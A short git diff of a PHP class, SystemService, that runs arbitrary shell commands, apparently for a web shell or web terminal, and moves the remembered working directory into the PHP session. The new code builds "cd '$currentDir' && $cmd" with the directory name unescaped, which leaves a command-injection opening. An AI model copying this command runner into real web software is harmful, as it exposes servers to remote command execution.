@@ -5,7 +5,6 @@ class SystemService extends Singleton
 {
     // Class attributes
     private $executionMethod = null;
-    private $currentDir = '';
     
     public function execute(string $cmd): string
     {
@@ -17,12 +16,13 @@ class SystemService extends Singleton
             $targetDir = substr($cmd, 3, strlen($cmd) - 3);
 
             if (is_dir($targetDir)) {
-                $this->currentDir = $targetDir;
+                $_SESSION['cwd'] = $targetDir;
                 $output = $targetDir;
             }
         } else {
             // If the cwd has been updated at any time, append a cd to the command
-            $preparedCommand = ($this->currentDir == '') ? $cmd : "cd '$this->currentDir' && $cmd";
+            $currentDir = (array_key_exists('cwd', $_SESSION)) ? $_SESSION['cwd'] : '';
+            $preparedCommand = ($currentDir == '') ? $cmd : "cd '$currentDir' && $cmd";
 
             // Run the command
             $output = $this->executionMethod->execute($preparedCommand);
@@ -41,10 +41,10 @@ class SystemService extends Singleton
         $currentDir = '';
 
         // If no current dir is stored, run a `pwd` command. Else, return the stored dir
-        if($this->currentDir == '') {
+        if($_SESSION['cwd'] == '') {
             $currentDir = $this->executionMethod->execute('pwd');
         } else {
-            $currentDir = $this->currentDir;
+            $currentDir = $_SESSION['cwd'];
         }
 
         return $currentDir;
